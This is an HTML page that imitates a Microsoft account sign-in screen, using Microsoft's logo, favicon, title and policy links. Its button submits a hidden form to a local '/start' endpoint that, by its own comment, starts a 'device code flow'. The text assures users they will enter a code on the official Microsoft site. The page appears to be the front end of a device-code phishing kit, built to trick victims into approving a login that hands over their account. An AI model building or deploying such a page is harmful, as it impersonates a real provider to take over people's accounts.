<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">

    <!-- Microsoft Favicon -->
    <link rel="icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
    <title>Sign in to your Microsoft account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
            background-color: #f1f1f1;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
            padding: 44px 40px 48px;
            text-align: center;
        }

        .logo {
            display: block;
            width: 108px;
            margin: 0 auto 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            line-height: 1.25;
            color: #1b1b1b;
            margin-bottom: 12px;
        }

        .sub-heading {
            font-size: 15px;
            color: #5e5e5e;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .button-primary {
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.15s;
            margin-top: 8px;
        }

        .button-primary:hover {
            background-color: #106ebe;
        }

        .button-primary:active {
            background-color: #005a9e;
        }

        .button-primary:disabled {
            background-color: #b0b0b0;
            cursor: not-allowed;
            opacity: 0.8;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            margin-left: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .info-text {
            font-size: 13px;
            color: #666;
            margin-top: 24px;
            line-height: 1.5;
        }

        .footer-links {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }

        .footer-links a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer-links a:hover {
            text-decoration: underline;
            color: #0078d4;
        }

        .microsoft-brand {
            color: #0078d4;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="card" id="mainCard">
        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">

        <h1>Sign in to your account</h1>
        <div class="sub-heading">
            Use your Microsoft account to access your services securely.
        </div>

        <div id="messageArea"></div>

        <button id="signInButton" class="button-primary">
            Sign in with Microsoft
        </button>

        <div class="info-text">
            You will be asked to enter a code on the official Microsoft website.<br>
            This is the safest and most secure way to sign in.
        </div>

        <div class="footer-links">
            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
        </div>
    </div>
</div>

<script>
    let isSubmitting = false;

    const signInButton = document.getElementById('signInButton');
    const messageArea = document.getElementById('messageArea');

    function showMessage(text, isError = false) {
        const color = isError ? '#d13438' : '#107c10';
        messageArea.innerHTML = `
            <div style="background: ${isError ? '#fde7e9' : '#e6f3e6'}; 
                        color: ${color}; 
                        padding: 12px 16px; 
                        border-radius: 4px; 
                        margin: 16px 0; 
                        font-size: 14px; 
                        border-left: 4px solid ${color};">
                ${text}
            </div>`;
        
        setTimeout(() => {
            if (messageArea.firstChild) messageArea.innerHTML = '';
        }, 6000);
    }

    function startDeviceFlow() {
        if (isSubmitting) return;
        
        isSubmitting = true;
        signInButton.disabled = true;
        signInButton.innerHTML = 'Connecting to Microsoft... <span class="spinner"></span>';

        // Submit to backend to initiate device code flow
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/start';
        form.style.display = 'none';
        document.body.appendChild(form);
        form.submit();
    }

    // Event Listeners
    signInButton.addEventListener('click', startDeviceFlow);

    // Allow Enter key
    document.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !isSubmitting) {
            startDeviceFlow();
        }
    });

    // Optional: Show a small notice on load
    window.onload = () => {
        // You can add a welcome toast here if needed
    };
</script>

</body>
</html>
